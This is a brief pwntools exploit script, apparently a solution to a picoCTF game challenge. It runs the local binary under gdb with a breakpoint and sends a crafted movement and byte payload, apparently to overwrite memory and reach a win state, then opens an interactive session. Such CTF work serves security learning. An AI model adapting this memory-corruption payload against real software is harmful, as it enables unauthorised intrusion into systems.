from pwn import *

context.log_level = 'debug'
#io = remote('saturn.picoctf.net', 62019)
io = process('./game')

gdb_scripts = """
b* 0x0804975c
"""

gdb.attach(io, gdb_scripts)

payload = b'l]'
payload += b'wwwaaaaaaaaaaaaaa'
payload += b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaw'

io.sendline(payload) 
io.interactive()
